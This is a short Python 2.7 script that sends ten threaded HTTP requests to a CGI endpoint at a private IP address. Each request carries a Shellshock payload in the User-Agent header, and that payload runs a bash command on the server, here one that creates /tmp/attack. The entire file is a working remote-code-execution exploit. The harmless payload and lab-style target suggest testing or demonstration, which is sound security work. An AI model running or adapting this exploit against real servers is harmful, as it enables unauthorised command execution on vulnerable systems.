#!/usr/local/bin/python2.7

import urllib2
import threading
import time

def httpconn(url):
    
    request = urllib2.Request(url)
    request.add_header('User-Agent', '() { :;}; /bin/bash -c \x22/bin/touch /tmp/attack\x22')
    content_stream = urllib2.urlopen(request)
    time.sleep(2)
    content = content_stream.read()
    print content
    content_stream.close()
    
def main():
    url = 'http://10.0.3.109/cgi-bin/hello.py'
    thlist = []
    for i in range(10):
        th = threading.Thread(target=httpconn, args = (url,))
        thlist.append(th)
    for i in range(10):
        thlist[i].start()
    for i in range(10):
        thlist[i].join()
        
if __name__ == '__main__':
    main()